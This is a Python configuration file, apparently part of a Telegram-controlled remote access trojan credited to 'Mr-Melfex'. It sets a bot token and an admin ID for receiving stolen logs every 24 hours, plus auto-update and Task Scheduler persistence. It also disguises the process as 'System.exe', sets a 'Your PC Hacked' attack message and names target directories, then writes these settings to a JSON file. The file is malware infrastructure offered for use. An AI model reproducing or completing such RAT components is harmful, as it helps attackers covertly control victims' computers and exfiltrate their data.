# [~] Main_Config.py
# Codeing "UTF-8"
# CopyRight (C) 2023 By *Mr-Melfex*
# License BCD (SEE LICENSE IN MAIN FOLDER)

from    Main                import  *
from    Core.Main_Core      import  *

#//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--#

# Token telegram bot for conecting to telegram:
TelegramToken = "TOKEN"

# Id telegram accont for admin RAT:
TelegramID = "ID"

# Name for file Save Log:
LogFileName = "CHECKER-LOG"

# Send LogFile to bot:
SendLogFile = True

# Time send log(H):
TimeSleepSendLog = 24

# Auto Update:
AutoUpdate = True

# Run the script as administrator:
AdminRightsReq = False

# Check Update & Version:
CheckVersinReq = True

# Message Attak :
MessageAttak = "Your PC Hacked BY Mr-Melfex!"

# Directory for file attack:
AttackDirect = "C://Users//GUST MELFEX//Desktop//"

# Time Zone:
TimeZone = "Asia/Tehran"

# Installation directory
InstallPath = "C://Users//GUST MELFEX//Desktop//"

# Task name in Task Scheduler:
AutorunName = "EXENAME"

# The name of the process in the Task Manager:
ProcessName = "System.exe"

# Directory for saving files:
Direct = "C://Users//GUST MELFEX//Desktop//"



with open(InstallPath + "DateBase.json", "w", encoding="UTF-8") as JsonDB:
    JsonDB.writelines([
                    '{',
                    f'"TelegramToken" : "{TelegramToken}",\n"TelegramID" : "{TelegramID}",\n"LogFileName" : "{LogFileName}",\n"SendLogFile" : "{SendLogFile}",\n"TimeSleepSendLog" : "{TimeSleepSendLog}",\n"AutoUpdate" : "{AutoUpdate}",\n"AdminRightsReq" : "{AdminRightsReq}",\n"CheckVersinReq" : "{CheckVersinReq}",\n"MessageAttak" : "{MessageAttak}",\n"AttackDirect" : "{AttackDirect}",\n"TimeZone" : "{TimeZone}",\n"InstallPath" : "{InstallPath}",\n"AutorunName" : "{AutorunName}",\n"ProcessName" : "{ProcessName}",\n"Direct" : "{Direct}"',
                    '}'
                    ])
    JsonDB.close()

if TelegramToken == "TOKEN":
    LOG("[O_O] EROR! Open Config Folder & Main_Config.py Edit (TelegramToken)")

if TelegramID == "ID":
    LOG("[O_O] EROR! Open Config Folder & Main_Config.py Edit (TelegramID)")

if SendLogFile == False:
    LOG("[O_O] Auto send Log < OFF >")

if AutorunName == "EXENAME":
    LOG("[O_O] EROR! Open Config Folder & Main_Config.py Edit (AutorunName)")